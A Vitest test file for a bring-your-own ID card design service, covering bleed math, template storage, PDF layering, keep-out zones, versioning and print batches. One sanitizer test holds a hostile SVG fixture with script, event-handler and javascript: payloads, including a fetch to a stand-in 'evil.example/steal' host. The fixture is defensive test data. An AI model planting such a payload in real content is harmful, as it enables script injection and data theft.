// src/services/__tests__/idCardCustomDesignFlow.test.ts
// ============================================================================
// Phase 1 Unit Tests: Bring-Your-Own ID Card Design System
// Tests fit & bleed math, custom template persistence, and 5-layer compositing.
// ============================================================================

import { describe, it, expect, beforeEach, vi } from 'vitest';
import {
  analyzeArtworkFit,
  CR80_BLEED_PX,
  createEmptyCustomTemplate,
  saveCustomTemplate,
  fetchOrganizationTemplates,
  checkKeepOutCollisions,
  sanitizeSvgString,
  evaluateTextContrast,
  PREFLIGHT_STRESS_EMPLOYEES,
  adaptEpsSaaSTemplateConfig,
  DEFAULT_EPS_SAAS_CONFIG,
  getDefaultEpsYellowGeometricTemplate,
  bumpTemplateVersion,
  recordTemplateIssuance,
  exportIdTemplateBundle,
  importIdTemplateBundle,
  generateDesignGuideSpecKit,
  nudgeElementPosition,
  cloneStarterToCustomTemplate,
  validateTemplatePayload,
  cloneOrganizationTemplate,
  archiveOrganizationTemplate,
  saveDraftRecoverySnapshot,
  loadDraftRecoverySnapshot,
  clearDraftRecoverySnapshot,
  verifyDuplexAlignment,
  recordPrintProductionBatch,
} from '../../features/people/idcard/v2/customTemplateService';
import { BUILTIN_TEMPLATES_V2 } from '../../features/people/idcard/v2/templateRegistryV2';
import { CR80_LANDSCAPE, CR80_PORTRAIT, CardSideData, KeepOutZone } from '../../features/people/idcard/idCardTypes';
import { drawCardSide } from '../../features/people/idcard/idCardPdfEngine';
import { IdCardCustomTemplate } from '../../features/people/idcard/v2/types';

// In-memory localStorage polyfill for Node test runner
const memoryStorage = new Map<string, string>();
if (typeof globalThis.localStorage === 'undefined') {
  (globalThis as any).localStorage = {
    getItem: (key: string) => memoryStorage.get(key) || null,
    setItem: (key: string, value: string) => memoryStorage.set(key, value),
    removeItem: (key: string) => memoryStorage.delete(key),
    clear: () => memoryStorage.clear(),
  };
}

describe('Bring-Your-Own ID Card Design Engine (Phase 1)', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('analyzeArtworkFit: Bleed & Trim Sniffing', () => {
    it('detects exact 3mm bleed artwork (1082 x 709 px for landscape)', () => {
      const mockImg = {
        naturalWidth: 1082,
        naturalHeight: 709,
        width: 1082,
        height: 709,
      } as unknown as HTMLImageElement;

      const result = analyzeArtworkFit(mockImg, CR80_LANDSCAPE);
      expect(result.status).toBe('exact_bleed');
      expect(result.effDpi).toBeGreaterThanOrEqual(300);
      expect(result.message).toContain('Perfect Fit');
    });

    it('detects trim-only artwork without bleed (1011 x 638 px for landscape)', () => {
      const mockImg = {
        naturalWidth: 1011,
        naturalHeight: 638,
        width: 1011,
        height: 638,
      } as unknown as HTMLImageElement;

      const result = analyzeArtworkFit(mockImg, CR80_LANDSCAPE);
      expect(result.status).toBe('trim_only');
      expect(result.message).toContain('matches finished trim size');
    });

    it('detects ratio mismatch when an arbitrary square image is uploaded', () => {
      const mockImg = {
        naturalWidth: 1000,
        naturalHeight: 1000,
        width: 1000,
        height: 1000,
      } as unknown as HTMLImageElement;

      const result = analyzeArtworkFit(mockImg, CR80_LANDSCAPE);
      expect(result.status).toBe('ratio_mismatch');
      expect(result.aspectRatio).toBeCloseTo(1.0, 1);
    });

    it('accurately evaluates portrait bleed dimensions (709 x 1082 px)', () => {
      const mockImg = {
        naturalWidth: 709,
        naturalHeight: 1082,
        width: 709,
        height: 1082,
      } as unknown as HTMLImageElement;

      const result = analyzeArtworkFit(mockImg, CR80_PORTRAIT);
      expect(result.status).toBe('exact_bleed');
      expect(result.effDpi).toBeGreaterThanOrEqual(300);
    });
  });

  describe('Custom Template Persistence & Lifecycle', () => {
    it('creates an empty custom template skeleton with punch slot keepout zone', () => {
      const tpl = createEmptyCustomTemplate('ACME Staff Badge 2026', 'portrait', 'org-123', 'John Doe');
      expect(tpl.name).toBe('ACME Staff Badge 2026');
      expect(tpl.geometry.orientation).toBe('portrait');
      expect(tpl.version).toBe(1);
      expect(tpl.status).toBe('draft');
      expect(tpl.sides.front.keepOutZones).toHaveLength(1);
      expect(tpl.sides.front.keepOutZones[0].type).toBe('punch_slot');
    });

    it('saves and retrieves custom templates from storage', async () => {
      const tpl = createEmptyCustomTemplate('Engineering Pass', 'landscape', 'org-tech', 'Alice');
      await saveCustomTemplate(tpl);

      const loaded = await fetchOrganizationTemplates('org-tech');
      expect(loaded).toHaveLength(1);
      expect(loaded[0].name).toBe('Engineering Pass');
      expect(loaded[0].id).toBe(tpl.id);
    });

    it('updates an existing custom template without duplicating it', async () => {
      const tpl = createEmptyCustomTemplate('Engineering Pass', 'landscape', 'org-tech', 'Alice');
      await saveCustomTemplate(tpl);

      const modified: IdCardCustomTemplate = {
        ...tpl,
        version: 2,
        status: 'published',
      };
      await saveCustomTemplate(modified);

      const loaded = await fetchOrganizationTemplates('org-tech');
      expect(loaded).toHaveLength(1);
      expect(loaded[0].version).toBe(2);
      expect(loaded[0].status).toBe('published');
    });
  });

  describe('5-Layer PDF Engine Compositing with Transparent Overlays', () => {
    it('executes 5-layer drawCardSide without error when overlay image is present', () => {
      const mockCtx = {
        save: vi.fn(),
        restore: vi.fn(),
        fillRect: vi.fn(),
        strokeRect: vi.fn(),
        rect: vi.fn(),
        beginPath: vi.fn(),
        closePath: vi.fn(),
        arc: vi.fn(),
        arcTo: vi.fn(),
        roundRect: vi.fn(),
        clip: vi.fn(),
        drawImage: vi.fn(),
        fillText: vi.fn(),
        measureText: vi.fn().mockReturnValue({ width: 20 }),
        moveTo: vi.fn(),
        lineTo: vi.fn(),
        stroke: vi.fn(),
        fill: vi.fn(),
        setLineDash: vi.fn(),
        scale: vi.fn(),
        translate: vi.fn(),
        rotate: vi.fn(),
        fillStyle: '#000000',
        strokeStyle: '#000000',
        font: '',
        textAlign: 'left',
        textBaseline: 'top',
        lineWidth: 1,
        globalAlpha: 1,
      } as unknown as CanvasRenderingContext2D;

      const mockEmployee = {
        id: 'emp-1',
        name: 'Haripriya R',
        designation: 'Executive',
        idno: 'JCS-008',
        dept: 'HR & ADMIN',
        department: 'HR & ADMIN',
        branch: 'Joy Office',
        phone: '9500768211',
        blood: 'B+',
        dob: '12-04-1995',
        address: 'Coimbatore',
        valid: 'Dec 2028',
        org: 'Joy Corporate Solutions',
        photo: 'photo1.jpg',
        photo_matched: false,
      };

      const mockOverlay = {
        width: 1082,
        height: 709,
      } as unknown as HTMLImageElement;

      const sideData: CardSideData = {
        bg: '#ffffff',
        bgImg: null,
        bgName: '',
        overlayImg: mockOverlay,
        overlayName: 'test-overlay.png',
        els: [
          {
            id: 't1',
            type: 'text',
            text: '{name}',
            x: 10,
            y: 10,
            w: 50,
            h: 8,
            font: 'Inter',
            size: 10,
            color: '#111827',
            weight: 700,
            align: 'left',
            fit: true,
            bgPill: true,
            bgPillColor: 'rgba(255, 255, 255, 0.92)',
          },
        ],
      };

      // Ensure drawCardSide executes cleanly with overlay layer
      expect(() => {
        drawCardSide(mockCtx, sideData, mockEmployee, CR80_LANDSCAPE, 300, {
          cropMarks: true,
          showGuides: false,
          logo: null,
          photos: new Map(),
        });
      }).not.toThrow();

      // Verify that drawImage was called to draw the overlay image
      expect(mockCtx.drawImage).toHaveBeenCalledWith(
        mockOverlay,
        expect.any(Number),
        expect.any(Number),
        expect.any(Number),
        expect.any(Number)
      );
    });
  });

  describe('Phase 2: Keep-Out Zone Collision Engine', () => {
    const punchSlot: KeepOutZone = {
      id: 'punch-slot-top',
      type: 'punch_slot',
      x: 20.0,
      y: 3.0,
      w: 14.0,
      h: 3.0,
      bufferMm: 1.5,
      label: 'Lanyard Slot (14×3mm)',
    };

    it('detects element overlapping the punch slot keep-out zone', () => {
      const elements = [
        {
          id: 'el-name',
          type: 'text' as const,
          text: '{name}',
          x: 15,
          y: 4,
          w: 30,
          h: 6,
          font: 'Inter',
          size: 10,
          color: '#111827',
          weight: 700,
          align: 'center' as const,
          fit: true,
        },
      ];
      const warnings = checkKeepOutCollisions(elements, [punchSlot]);
      expect(warnings).toHaveLength(1);
      expect(warnings[0].elementId).toBe('el-name');
      expect(warnings[0].zoneLabel).toContain('Lanyard Slot');
      expect(warnings[0].suggestedY).toBeGreaterThan(punchSlot.y + punchSlot.h);
    });

    it('returns no warnings when element is safely positioned below the punch slot', () => {
      const elements = [
        {
          id: 'el-name',
          type: 'text' as const,
          text: '{name}',
          x: 15,
          y: 12,
          w: 30,
          h: 6,
          font: 'Inter',
          size: 10,
          color: '#111827',
          weight: 700,
          align: 'center' as const,
          fit: true,
        },
      ];
      const warnings = checkKeepOutCollisions(elements, [punchSlot]);
      expect(warnings).toHaveLength(0);
    });
  });

  describe('Phase 2: SVG Sanitization Pipeline', () => {
    it('strips <script>, <foreignObject>, and inline event handlers from hostile SVG', () => {
      const hostileSvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
        <script>fetch("https://evil.example/steal")</script>
        <foreignObject><iframe src="javascript:alert(2)"></iframe></foreignObject>
        <rect width="100" height="100" fill="red" onclick="hack()" />
      </svg>`;

      const result = sanitizeSvgString(hostileSvg);
      expect(result.isClean).toBe(false);
      expect(result.warnings.length).toBeGreaterThanOrEqual(3);
      expect(result.sanitizedSvg).not.toContain('<script');
      expect(result.sanitizedSvg).not.toContain('<foreignObject');
      expect(result.sanitizedSvg).not.toContain('onload=');
      expect(result.sanitizedSvg).not.toContain('onclick=');
    });

    it('passes clean vector SVG artwork with zero security warnings', () => {
      const cleanSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 709 1082">
        <rect width="709" height="1082" fill="#0f172a"/>
        <circle cx="354" cy="300" r="120" fill="#ffffff"/>
      </svg>`;

      const result = sanitizeSvgString(cleanSvg);
      expect(result.isClean).toBe(true);
      expect(result.warnings).toHaveLength(0);
    });
  });

  describe('Phase 2: WCAG 2.2 AA Contrast & Preflight Stress Dataset', () => {
    it('flags low contrast text and recommends an appropriate backing pill', () => {
      const lowContrast = evaluateTextContrast('#1e293b', '#0f172a');
      expect(lowContrast.passesAA).toBe(false);
      expect(lowContrast.ratio).toBeLessThan(4.5);
      expect(lowContrast.suggestedPillColor).toContain('255, 255, 255');

      const highContrast = evaluateTextContrast('#0f172a', '#ffffff');
      expect(highContrast.passesAA).toBe(true);
      expect(highContrast.ratio).toBeGreaterThanOrEqual(4.5);
    });

    it('provides 4 preflight stress employee records covering long names, Tamil script, missing photo, and missing fields', () => {
      expect(PREFLIGHT_STRESS_EMPLOYEES).toHaveLength(4);
      expect(PREFLIGHT_STRESS_EMPLOYEES[0].name.length).toBeGreaterThan(25);
      expect(PREFLIGHT_STRESS_EMPLOYEES[1].name).toMatch(/[\u0B80-\u0BFF]/); // Tamil Unicode block
      expect(PREFLIGHT_STRESS_EMPLOYEES[2].photo_matched).toBe(false);
    });
  });

  describe('EPS SaaS Integration Package Adapter (Yellow Geometric Corporate ID)', () => {
    it('adapts joy_eps_id_template_config.json to CR80 Portrait without stretching circular photo or square QR', () => {
      const tpl = adaptEpsSaaSTemplateConfig(DEFAULT_EPS_SAAS_CONFIG, { organizationId: 'org-joy' });
      expect(tpl.id).toBe('joy-eps-yellow-geometric-portrait');
      expect(tpl.geometry.orientation).toBe('portrait');
      expect(tpl.sides.front.baseAsset?.dataUrl).toContain('front_background.webp');
      expect(tpl.sides.back.baseAsset?.dataUrl).toContain('back_background.webp');

      // Verify front circular photo is 1:1 (w === h) and circularly masked
      const photoEl = tpl.sides.front.elements.find(e => e.type === 'image');
      expect(photoEl).toBeDefined();
      expect(photoEl?.w).toBeCloseTo(photoEl?.h || 0, 2);
      if (photoEl && photoEl.type === 'image') {
        expect(photoEl.radius).toBeCloseTo(photoEl.w / 2, 1);
      }

      // Verify back verification QR is 1:1 square
      const qrEl = tpl.sides.back.elements.find(e => e.type === 'qr');
      expect(qrEl).toBeDefined();
      expect(qrEl?.w).toBeCloseTo(qrEl?.h || 0, 2);
      if (qrEl && qrEl.type === 'qr') {
        expect(qrEl.qrData).toBe('{VerifyURL}');
      }
    });

    it('returns ready-to-use default EPS Yellow Geometric template with locked masks and employee bindings', () => {
      const tpl = getDefaultEpsYellowGeometricTemplate('org-joy');
      const frontTexts = tpl.sides.front.elements.filter(e => e.type === 'text');
      expect(frontTexts.some(t => t.type === 'text' && t.text.includes('{name}'))).toBe(true);
      expect(frontTexts.some(t => t.type === 'text' && t.text.includes('{designation}'))).toBe(true);
      const backRects = tpl.sides.back.elements.filter(e => e.type === 'rect');
      expect(backRects.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe('Phase 3: Template Versioning, .idtemplate Bundle Sharing & Prepress Spec Kit', () => {
    it('bumps template version (v1 -> v2) while preserving prior version issuance snapshot in versionHistory', async () => {
      const tpl = createEmptyCustomTemplate('HQ Security Badge', 'portrait', 'org-hq', 'Mari Muthu');
      const withIssuance = await recordTemplateIssuance(tpl, 19);
      expect(withIssuance.issuedCardsCount).toBe(19);

      const bumped = await bumpTemplateVersion(withIssuance, 'Mari Muthu', 'Updated QR quiet zone');
      expect(bumped.version).toBe(2);
      expect(bumped.versionHistory).toHaveLength(1);
      expect(bumped.versionHistory?.[0].version).toBe(1);
      expect(bumped.versionHistory?.[0].issuedCardsCount).toBe(19);
      expect(bumped.versionHistory?.[0].notes).toBe('Updated QR quiet zone');
    });

    it('exports and imports a portable .idtemplate.json bundle with checksum integrity', async () => {
      const tpl = getDefaultEpsYellowGeometricTemplate('org-branch-1');
      const bundleJson = exportIdTemplateBundle(tpl, 'Mari Muthu');
      const parsedBundle = JSON.parse(bundleJson);

      expect(parsedBundle.bundleFormat).toBe('joy-idtemplate-v1');
      expect(parsedBundle.checksum).toMatch(/^fnv1a_[0-9a-f]{8}$/);

      const imported = await importIdTemplateBundle(bundleJson, 'org-branch-2', 'Branch HR');
      expect(imported.id).toBe(tpl.id);
      expect(imported.organizationId).toBe('org-branch-2');
      expect(imported.source).toBe('import');
      expect(imported.sides.front.elements.length).toBe(tpl.sides.front.elements.length);
    });

    it('generates 300 DPI Prepress Designer Spec Kits for both Portrait (709x1082) and Landscape (1082x709)', () => {
      const portraitKit = generateDesignGuideSpecKit('portrait');
      expect(portraitKit.widthPx).toBe(709);
      expect(portraitKit.heightPx).toBe(1082);
      expect(portraitKit.dpi).toBe(300);
      expect(portraitKit.svgGuideContent).toContain('LANYARD PUNCH KEEP-OUT');
      expect(portraitKit.readmeMarkdown).toContain('709 × 1082 px');

      const landscapeKit = generateDesignGuideSpecKit('landscape');
      expect(landscapeKit.widthPx).toBe(1082);
      expect(landscapeKit.heightPx).toBe(709);
      expect(landscapeKit.readmeMarkdown).toContain('1082 × 709 px');
    });
  });

  describe('Phase 4: 6 Distinct Starter Archetypes, Keyboard Nudge & Starter Cloning', () => {
    it('defines 6 genuinely distinct architectural layout archetypes across BUILTIN_TEMPLATES_V2', () => {
      expect(BUILTIN_TEMPLATES_V2).toHaveLength(6);
      const archetypes = new Set(BUILTIN_TEMPLATES_V2.map(t => t.layoutArchetype));
      expect(archetypes.size).toBe(6);
      expect(Array.from(archetypes)).toEqual([
        'diagonal_corporate',
        'safety_band',
        'split_duo',
        'lanyard_arch',
        'minimal_monospace',
        'security_badge',
      ]);
    });

    it('nudges placed elements by 0.5mm and 2.0mm while clamping cleanly within CR80 boundaries', () => {
      const el = {
        id: 'el-name',
        type: 'text' as const,
        text: '{name}',
        x: 10.0,
        y: 20.0,
        w: 30.0,
        h: 6.0,
        font: 'Inter' as const,
        size: 10,
        color: '#111827',
        weight: 700 as const,
        align: 'center' as const,
        fit: true,
        overflowMode: 'shrink' as const,
        maxLines: 1,
        minSize: 6,
        verticalAlign: 'middle' as const,
        rotation: 0,
        locked: false,
        hidden: false,
        opacity: 1,
      };

      const nudgedFine = nudgeElementPosition(el, 0.5, -0.5, CR80_PORTRAIT);
      expect(nudgedFine.x).toBe(10.5);
      expect(nudgedFine.y).toBe(19.5);

      const nudgedCoarse = nudgeElementPosition(nudgedFine, 2.0, 2.0, CR80_PORTRAIT);
      expect(nudgedCoarse.x).toBe(12.5);
      expect(nudgedCoarse.y).toBe(21.5);

      // Clamp check against negative and right/bottom overflow
      const clampedMin = nudgeElementPosition(el, -50, -50, CR80_PORTRAIT);
      expect(clampedMin.x).toBe(0);
      expect(clampedMin.y).toBe(0);

      const clampedMax = nudgeElementPosition(el, 100, 100, CR80_PORTRAIT);
      expect(clampedMax.x).toBe(Number((CR80_PORTRAIT.w - el.w).toFixed(2)));
      expect(clampedMax.y).toBe(Number((CR80_PORTRAIT.h - el.h).toFixed(2)));
    });

    it('clones any starter template into an editable Organization Custom Template with 300 DPI SVG background', async () => {
      const lanyardStarter = BUILTIN_TEMPLATES_V2.find(t => t.layoutArchetype === 'lanyard_arch')!;
      const cloned = await cloneStarterToCustomTemplate(lanyardStarter, 'org-hq', 'Mari Muthu');

      expect(cloned.source).toBe('starter');
      expect(cloned.name).toContain('Lanyard Arch Tech Badge');
      expect(cloned.sides.front.baseAsset?.dataUrl).toContain('data:image/svg+xml');
      expect(cloned.sides.front.elements.length).toBeGreaterThanOrEqual(4);
    });
  });

  describe('V2.1 Enterprise Redesign: Defensive Validation, Org Cloning, Non-Destructive Archive, Autosave Recovery & Idempotent Print Batches', () => {
    it('defensively validates template JSON and blocks corrupted or incomplete payloads', () => {
      const invalidCheck = validateTemplatePayload({ id: '', geometry: { w: -10, h: 0 } });
      expect(invalidCheck.valid).toBe(false);
      expect(invalidCheck.errors.length).toBeGreaterThanOrEqual(3);

      const validTpl = createEmptyCustomTemplate('Valid Corporate CR80', 'portrait', 'org-hq');
      const validCheck = validateTemplatePayload(validTpl);
      expect(validCheck.valid).toBe(true);
      expect(validCheck.errors).toHaveLength(0);
    });

    it('clones and non-destructively archives organization templates while preserving issued card history', async () => {
      const original = createEmptyCustomTemplate('Plant Security V1', 'portrait', 'org-hq', 'Mari Muthu');
      const withIssued = await recordTemplateIssuance(original, 42);

      const cloned = await cloneOrganizationTemplate(withIssued, 'org-hq', 'Mari Muthu');
      expect(cloned.id).not.toBe(withIssued.id);
      expect(cloned.status).toBe('draft');
      expect(cloned.issuedCardsCount).toBe(0);

      const archived = await archiveOrganizationTemplate(withIssued, 'Mari Muthu');
      expect(archived.status).toBe('archived');
      expect(archived.versionHistory?.[0].issuedCardsCount).toBe(42);
    });

    it('saves, restores, and clears draft recovery snapshots across browser refreshes', () => {
      const tpl = createEmptyCustomTemplate('Draft Recovery Test', 'portrait', 'org-recovery');
      saveDraftRecoverySnapshot({
        organizationId: 'org-recovery',
        templateId: tpl.id,
        templateName: tpl.name,
        savedAt: new Date().toISOString(),
        geometry: tpl.geometry,
        front: tpl.sides.front,
        back: tpl.sides.back,
      });

      const restored = loadDraftRecoverySnapshot('org-recovery');
      expect(restored).not.toBeNull();
      expect(restored?.templateName).toBe('Draft Recovery Test');

      clearDraftRecoverySnapshot('org-recovery');
      expect(loadDraftRecoverySnapshot('org-recovery')).toBeNull();
    });

    it('verifies Front/Back duplex trim (53.98 x 85.60 mm) and full bleed (59.98 x 91.60 mm) alignment and enforces idempotent print batch recording', () => {
      const duplex = verifyDuplexAlignment(CR80_PORTRAIT, CR80_PORTRAIT);
      expect(duplex.aligned).toBe(true);
      expect(duplex.trimWidthMm).toBe(53.98);
      expect(duplex.trimHeightMm).toBe(85.6);
      expect(duplex.fullBleedWidthMm).toBe(59.98);
      expect(duplex.fullBleedHeightMm).toBe(91.6);

      const batch1 = recordPrintProductionBatch({
        templateId: 'tpl-1',
        templateName: 'Corporate Portrait V1',
        templateVersion: 1,
        employeeIds: ['emp-1', 'emp-2', 'emp-3'],
        format: 'sheet_a4',
        dpi: 300,
        iccProfile: 'ISO_COATED_V2',
      });
      expect(batch1.isDuplicate).toBe(false);

      const batch2 = recordPrintProductionBatch({
        templateId: 'tpl-1',
        templateName: 'Corporate Portrait V1',
        templateVersion: 1,
        employeeIds: ['emp-3', 'emp-1', 'emp-2'], // same set in different order
        format: 'sheet_a4',
        dpi: 300,
        iccProfile: 'ISO_COATED_V2',
      });
      expect(batch2.isDuplicate).toBe(true);
      expect(batch2.batch.batchId).toBe(batch1.batch.batchId);
    });
  });
});
